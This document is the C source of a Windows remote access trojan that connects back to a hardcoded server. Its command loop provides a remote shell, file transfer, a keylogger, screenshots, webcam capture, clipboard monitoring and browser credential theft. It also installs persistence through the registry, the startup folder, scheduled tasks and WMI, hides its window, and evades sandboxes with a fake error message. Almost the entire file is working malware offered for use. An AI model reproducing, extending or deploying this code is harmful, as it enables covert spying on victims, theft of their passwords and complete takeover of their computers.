#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

#include "status.h"
#include "logger.h"
#include "screen.h"
#include "str_cut.h"
#include "wol.h"
#include "process.h"
#include "clipboard.h"
#include "browser.h"
#include "webcam.h"
#include "persistence.h"
#include "evasion.h"

// Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

#define bzero(p, size) (void)memset((p), 0, (size))

#define _CRT_SECURE_NO_DEPRECATE

// Define Socket
int sock;

int bootRun()
{
  // Initialize variables
  char err[128] = "Failed to create Persistence.\n";
  char suc[128] = "Successfully added Persistence at: Computer\\HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
  TCHAR szPath[MAX_PATH];
  DWORD pathLen = 0;

  pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);

  if (pathLen == 0)
  {
    // An error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Handle to open registry key
  HKEY NewVal;

  // Open regkey
  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS)
  {
    // An other error occurred
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  DWORD pathLenInBytes = pathLen * sizeof(*szPath);
  if (RegSetValueEx(NewVal, TEXT("Pwnd by BlxdMoon"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS)
  {
    // Couldn't create key
    RegCloseKey(NewVal);
    send(sock, err, sizeof(err), 0);
    return -1;
  }

  // Successfully added Persistence
  RegCloseKey(NewVal);
  send(sock, suc, sizeof(suc), 0);

  return 0;
}

void Shell()
{
  // The command which we receive from the server
  char buffer[1024];
  char container[1024];
  char total_response[18384];

  while (1)
  {
    // Clear variables
    bzero(buffer, sizeof(buffer));
    bzero(container, sizeof(container));
    bzero(total_response, sizeof(total_response));

    // Receive command from server
    recv(sock, buffer, 1024, 0);

    if (strcmp("q", buffer) == 0) // Use strncmp for comparing a specific number of characters
    {
      // info("Quitting Connection..");
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else if (strncmp("file:", buffer, 5) == 0)
    {
      // Get the file size
      char *token = strtok(buffer, ":");
      token = strtok(NULL, ":");
      int size = atoi(token);

      // Get the filename
      token = strtok(NULL, ":");
      char *filename = token;

      // Get the file contents
      token = strtok(NULL, ":");
      char *file_contents = token;

      // Create a file pointer
      FILE *file;

      // Open the file
      file = fopen(filename, "wb");

      // Write the file contents
      fwrite(file_contents, sizeof(char), size, file);

      // Close the file
      fclose(file);

      // Send success message
      char suc[128];
      sprintf(suc, "[+] File %s uploaded successfully on `%s`.\n", filename, getenv("COMPUTERNAME"));
      send(sock, suc, sizeof(suc), 0);
    }
    else if (strncmp("wol:", buffer, 4) == 0)
    {
      // Extract MAC address after "wol:"
      char *mac = buffer + 4;
      char response[128];

      if (send_magic_packet(mac) == 0)
      {
        sprintf(response, "[+] WOL magic packet sent to %s\n", mac);
      }
      else
      {
        sprintf(response, "[-] Failed to send WOL packet. Check MAC format (AA:BB:CC:DD:EE:FF)\n");
      }
      send(sock, response, sizeof(response), 0);
    }
    else if (strncmp("info", buffer, 4) == 0)
    {
      // Handle new feature
      char info[1024];

      // Get computer name
      char computer_name[1024];
      DWORD size = sizeof(computer_name);
      GetComputerNameA(computer_name, &size);

      // Get username
      char username[1024];
      DWORD len = sizeof(username);
      GetUserNameA(username, &len);

      // Get OS version
      char os[1024];
      DWORD os_len = sizeof(os);
      GetVersionExA((LPOSVERSIONINFO)&os_len);

      // Get IP address
      char ip[1024];
      DWORD ip_len = sizeof(ip);
      gethostname(ip, ip_len);
      struct hostent *host_entry;
      host_entry = gethostbyname(ip);
      char *ip_addr = inet_ntoa(*((struct in_addr *)host_entry->h_addr_list[0]));

      // Get CPU info
      char cpu[1024];
      DWORD cpu_len = sizeof(cpu);
      GetEnvironmentVariableA("PROCESSOR_IDENTIFIER", cpu, cpu_len);

      // Get GPU info
      char gpu[1024];
      DWORD gpu_len = sizeof(gpu);
      GetEnvironmentVariableA("GPU", gpu, gpu_len);

      // Add all information to info variable
      sprintf(info, "Computer name: %s\nUsername: %s\nOS: %s\nIP: %s\nCPU: %s\nGPU: %s\n", computer_name, username, os, ip_addr, cpu, gpu);

      // Send info to server
      send(sock, info, sizeof(info), 0);
    }
    else if (strcmp("keylogger:start", buffer) == 0)
    {
      // info("Starting Keylogger..");

      // Create a thread to run logger
      HANDLE thread = CreateThread(NULL, 0, logger, NULL, 0, NULL);

      // Continue listening for commands
      continue;
    }
    else if (strncmp("cd ", buffer, 3) == 0)
    {
      // Get the directory from the original buffer
      char *str = str_cut(buffer, 3, 100);

      // Change directory
      chdir(str);

      // Send response
      send(sock, "Directory changed.\n", sizeof("Directory changed."), 0);
    }
    else if (strncmp("screen", buffer, 6) == 0)
    {
      // Build base path for screens dir
      char BASE_PATH[256]; // Allocate memory for BASE_PATH
      sprintf(BASE_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\screen", getenv("USERNAME"));

      if (mkdir(BASE_PATH) != 0)
      {
      }

      // Build new path for single screenshot
      char *UUID = generate_uuid();
      char SCREENSHOT_FILE[256]; // Allocate memory for SCREENSHOT_FILE
      sprintf(SCREENSHOT_FILE, "%s\\%s.bmp", BASE_PATH, UUID);

      // Capture screen
      screenCapture(0, 0, 1920, 1080, SCREENSHOT_FILE);

      char suc[128];
      sprintf(suc, "[+] Screenshot saved to: %s\n", SCREENSHOT_FILE);

      // Send back path of screenshot
      send(sock, suc, sizeof(suc), 0);
    }
    else if (strncmp("download ", buffer, 9) == 0)
    {
      // Get the filename after cf
      char *filename = str_cut(buffer, 3, 100);

      // Read the file contents
      FILE *file;
      file = fopen(filename, "rb");

      // Check if file exists
      if (file == NULL)
      {
        // Send error message
        char err[128];
        sprintf(err, "[-] File %s not found.\n", filename);
        send(sock, err, sizeof(err), 0);
        continue;
      }

      // Get file size
      fseek(file, 0, SEEK_END);

      // Get file size
      int size = ftell(file);

      // Reset file pointer
      rewind(file);

      // Allocate memory for file contents
      char *file_contents = malloc(size * (sizeof(char)));

      // Read file contents
      fread(file_contents, sizeof(char), size, file);

      char rspns[18384];
      sprintf(rspns, "file:%d:%s:%s", size, filename, file_contents);

      // Send file contents
      send(sock, rspns, sizeof(rspns), 0);
    }
    else if (strncmp("persist", buffer, 7) == 0)
    {
      char response[512];

      if (strncmp("persist:registry", buffer, 16) == 0)
      {
        int r = PersistRegistry();
        snprintf(response, sizeof(response),
          "[+] Registry persistence: %d keys added%s\n",
          r, IsElevated() ? " (admin mode)" : "");
      }
      else if (strncmp("persist:startup", buffer, 15) == 0)
      {
        int r = PersistStartupFolder();
        snprintf(response, sizeof(response),
          "[+] Startup folder: %s\n", r ? "success" : "failed");
      }
      else if (strncmp("persist:task", buffer, 12) == 0)
      {
        int r = PersistScheduledTask();
        snprintf(response, sizeof(response),
          "[+] Scheduled tasks: %s\n", r ? "success" : "failed");
      }
      else if (strncmp("persist:wmi", buffer, 11) == 0)
      {
        int r = PersistWMI();
        snprintf(response, sizeof(response),
          "[+] WMI subscription: %s\n", r ? "success" : "failed");
      }
      else if (strncmp("persist:check", buffer, 13) == 0)
      {
        int r = PersistCheck();
        snprintf(response, sizeof(response),
          "[+] Persistence check: %d repairs made\n", r);
      }
      else
      {
        // Default: run all persistence mechanisms
        int r = PersistAll();
        snprintf(response, sizeof(response),
          "[+] All persistence mechanisms executed\n"
          "    Mechanisms installed: %d\n"
          "    Admin mode: %s\n"
          "    Watchdog: active\n",
          r, IsElevated() ? "Yes (HKLM keys added)" : "No (user-level only)");
      }

      send(sock, response, strlen(response), 0);
    }
    else if (strcmp("ps", buffer) == 0)
    {
      // List all running processes
      char *procs = list_processes();
      if (procs != NULL)
      {
        send(sock, procs, strlen(procs), 0);
        free(procs);
      }
      else
      {
        send(sock, "[-] Failed to list processes\n", 30, 0);
      }
    }
    else if (strncmp("kill:", buffer, 5) == 0)
    {
      // Kill process by PID
      DWORD pid = atoi(buffer + 5);
      char response[128];

      if (kill_process(pid) == 0)
      {
        sprintf(response, "[+] Process %lu terminated successfully\n", pid);
      }
      else
      {
        sprintf(response, "[-] Failed to terminate process %lu (check PID or permissions)\n", pid);
      }
      send(sock, response, sizeof(response), 0);
    }
    else if (strcmp("clipboard:start", buffer) == 0)
    {
      // Start clipboard monitor thread
      HANDLE thread = CreateThread(NULL, 0, clipboard_monitor, NULL, 0, NULL);
      if (thread != NULL)
      {
        char *logpath = get_clipboard_logpath();
        char response[256];
        sprintf(response, "[+] Clipboard monitor started. Logging to: %s\n", logpath);
        send(sock, response, strlen(response), 0);
        free(logpath);
      }
      else
      {
        send(sock, "[-] Failed to start clipboard monitor\n", 40, 0);
      }
    }
    else if (strcmp("clipboard:dump", buffer) == 0)
    {
      // Get current clipboard contents
      char *contents = get_clipboard_contents();
      if (contents != NULL)
      {
        send(sock, contents, strlen(contents), 0);
        free(contents);
      }
      else
      {
        send(sock, "[-] Failed to get clipboard contents\n", 39, 0);
      }
    }
    else if (strcmp("browser:creds", buffer) == 0)
    {
      // Extract all browser credentials
      char *creds = extract_all_credentials();
      if (creds != NULL)
      {
        send(sock, creds, strlen(creds), 0);
        free(creds);
      }
      else
      {
        send(sock, "[-] Failed to extract credentials\n", 36, 0);
      }
    }
    else if (strcmp("browser:chrome", buffer) == 0)
    {
      // Extract Chrome credentials only
      char *creds = extract_chrome_credentials();
      if (creds != NULL)
      {
        send(sock, creds, strlen(creds), 0);
        free(creds);
      }
      else
      {
        send(sock, "[-] Failed to extract Chrome credentials\n", 43, 0);
      }
    }
    else if (strcmp("browser:firefox", buffer) == 0)
    {
      // Extract Firefox credentials only
      char *creds = extract_firefox_credentials();
      if (creds != NULL)
      {
        send(sock, creds, strlen(creds), 0);
        free(creds);
      }
      else
      {
        send(sock, "[-] Failed to extract Firefox credentials\n", 44, 0);
      }
    }
    else if (strcmp("webcam", buffer) == 0)
    {
      // Capture webcam frame
      char BASE_PATH[256];
      sprintf(BASE_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\webcam", getenv("USERNAME"));
      mkdir(BASE_PATH);

      char *UUID = generate_uuid();
      char WEBCAM_FILE[256];
      sprintf(WEBCAM_FILE, "%s\\%s.bmp", BASE_PATH, UUID);

      if (capture_webcam_frame(WEBCAM_FILE) == 0)
      {
        char suc[256];
        sprintf(suc, "[+] Webcam frame saved to: %s\n", WEBCAM_FILE);
        send(sock, suc, strlen(suc), 0);
      }
      else
      {
        send(sock, "[-] Webcam capture failed (no device or not implemented)\n", 58, 0);
      }
    }
    else if (strcmp("webcam:list", buffer) == 0)
    {
      // List webcam devices
      char *devices = list_webcam_devices();
      if (devices != NULL)
      {
        send(sock, devices, strlen(devices), 0);
        free(devices);
      }
      else
      {
        send(sock, "[-] Failed to list webcam devices\n", 35, 0);
      }
    }
    else
    {
      // Open a file description to execute system commands
      FILE *fp = _popen(buffer, "r");
      while (fgets(container, 1024, fp) != NULL)
      {
        // Concatenate response to total_response
        strcat(total_response, container);
      }

      // Send the response to the server
      // printf("%s", total_response); DEBUGGING PURPOSES
      send(sock, total_response, sizeof(total_response), 0);

      // Close fp
      fclose(fp);
    }
  }
}

// Function to establish the connection
int EstablishConnection(const char *ServerIp, unsigned short ServerPort)
{
  struct sockaddr_in ServAddr;

  // Initialize Socket (Use IPv4, TCP)
  sock = socket(AF_INET, SOCK_STREAM, 0);

  // Check if socket creation failed
  if (sock == INVALID_SOCKET)
  {
    // error("Socket creation failed");
    return 1;
  }

  // Clear
  memset(&ServAddr, 0, sizeof(ServAddr));

  // Reset config
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.S_un.S_addr = inet_addr(ServerIp);
  ServAddr.sin_port = htons(ServerPort);

  // Connect every 5 seconds
  while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
  {
    Sleep(5);
  }

  return 0; // Connection established successfully
}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
  if (hPrev != 0)
  {
    // error("hPrev should be 0.");
    return 1;
  }

  // ============================================================
  // EVASION: Initialize anti-analysis and bypass security tools
  // This must be called FIRST before any suspicious activity
  // ============================================================
  if (!InitEvasion())
  {
    // Analysis environment detected (VM, debugger, or sandbox)
    // InitEvasion() already showed a fake error message
    // Exit cleanly without revealing true purpose
    return 0;
  }

  // Run without showing CMD window
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);

  // Define variables
  char *ServerIp = "192.168.1.65";
  unsigned short ServerPort = 6709;

  // Check if WinSock is ready
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
  {
    // error("Couldn't initiate WinSock.");
    exit(1);
  }

  // Establish connection
  if (EstablishConnection(ServerIp, ServerPort) != 0)
  {
    // Handle connection failure
    // error("Coudln't establish connection.");
    return 1;
  }

  // Enable WOL (multi-vendor support)
  enable_wol();

  // Start persistence watchdog thread (self-healing)
  StartWatchdogThread();

  // Enter into Shell
  Shell();

  // Close the socket when done
  closesocket(sock);

  return 0;
};
